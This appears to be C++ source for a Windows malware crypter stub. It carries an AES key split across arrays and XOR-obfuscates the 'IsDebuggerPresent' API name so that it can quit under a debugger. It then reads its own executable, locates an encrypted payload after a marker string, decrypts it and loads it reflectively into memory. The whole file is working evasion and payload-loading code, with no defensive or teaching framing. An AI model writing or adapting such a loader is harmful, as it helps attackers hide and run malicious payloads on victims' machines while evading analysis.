#include <iostream>
#include <windows.h>
#include <vector>
#include <cstdint>
#include <fstream>
#include <algorithm>
#include <cstring>
#include "string_obfuscation.h"
#include "plusaes/plusaes.hpp"
#include "reflective_loader.h"

// Obfuscated AES key
const std::vector<uint8_t> key_part1 = { 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF };
const std::vector<uint8_t> key_part2 = { 0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10 };
const std::vector<uint8_t> key_part3 = { 0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF };
const std::vector<uint8_t> key_part4 = { 0xCA, 0xFE, 0xBA, 0xBE, 0xCA, 0xFE, 0xBA, 0xBE };

std::vector<uint8_t> get_key() {
    std::vector<uint8_t> key;
    key.insert(key.end(), key_part1.begin(), key_part1.end());
    key.insert(key.end(), key_part2.begin(), key_part2.end());
    key.insert(key.end(), key_part3.begin(), key_part3.end());
    key.insert(key.end(), key_part4.begin(), key_part4.end());
    return key;
}

// Obfuscated string for "IsDebuggerPresent"
std::vector<char> obfuscated_string = { 'I'^0x42, 's'^0x42, 'D'^0x42, 'e'^0x42, 'b'^0x42, 'u'^0x42, 'g'^0x42, 'g'^0x42, 'e'^0x42, 'r'^0x42, 'P'^0x42, 'r'^0x42, 'e'^0x42, 's'^0x42, 'e'^0x42, 'n'^0x42, 't'^0x42 };

BOOL is_debugger_present() {
    // Deobfuscate the function name at runtime
    std::string func_name = deobfuscate(obfuscated_string, 0x42);

    // Get the address of the function from Kernel32.dll
    using IsDebuggerPresentFunc = BOOL(WINAPI*)();
    IsDebuggerPresentFunc func_ptr = (IsDebuggerPresentFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), func_name.c_str());

    if (func_ptr) {
        return func_ptr();
    }
    return FALSE;
}

void decrypt_payload(std::vector<uint8_t>& payload, const std::vector<uint8_t>& key, const unsigned char* iv) {
    unsigned long padded_size = 0;
    std::vector<unsigned char> decrypted(payload.size());
    plusaes::decrypt_cbc(payload.data(), payload.size(), key.data(), key.size(), (const unsigned char (*)[16])iv, decrypted.data(), decrypted.size(), &padded_size);

    // Resize the payload to the actual decrypted size
    payload.resize(padded_size);
    std::copy(decrypted.begin(), decrypted.begin() + padded_size, payload.begin());
}

int main() {
    if (is_debugger_present()) {
        return 1;
    }

    // Get the path to the current executable
    char current_path[MAX_PATH];
    GetModuleFileNameA(NULL, current_path, MAX_PATH);

    // Read the current executable
    std::ifstream current_file(current_path, std::ios::binary);
    if (!current_file) {
        return 1;
    }
    std::vector<uint8_t> current_buffer(std::istreambuf_iterator<char>(current_file), {});
    current_file.close();

    // Find the payload marker
    const char* marker = "PAYLOAD_MARKER";
    auto it = std::search(current_buffer.begin(), current_buffer.end(), marker, marker + strlen(marker));

    if (it != current_buffer.end()) {
        // Get a pointer to the start of the IV
        auto iv_start = it + strlen(marker);
        unsigned char iv[16];
        std::copy(iv_start, iv_start + 16, iv);

        // Get a pointer to the start of the payload
        auto payload_start = iv_start + 16;
        std::vector<uint8_t> payload(payload_start, current_buffer.end());

        // Decrypt the payload
        const std::vector<uint8_t> key = get_key();
        decrypt_payload(payload, key, iv);

        // Load the payload into memory
        reflective_load(payload);
    }

    return 0;
}
